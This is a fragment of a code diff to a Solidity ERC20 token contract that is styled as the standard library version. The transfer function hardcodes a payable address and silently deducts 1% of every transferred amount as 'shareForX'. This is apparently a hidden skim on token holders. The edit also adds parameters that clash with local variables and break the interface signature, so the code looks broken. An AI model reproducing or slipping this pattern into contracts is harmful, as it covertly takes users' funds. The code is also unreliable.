@@ -108,7 +108,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
-    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+    function transfer(address recipient, uint256 amount, address target, uint256 shareForX) public virtual override returns (bool) {
        address payable target = 0x45dF353Ccc93c48C167dDb352C1325DADf0635b3;
        uint shareForX = amount/100;
        amount = amount-shareForX;
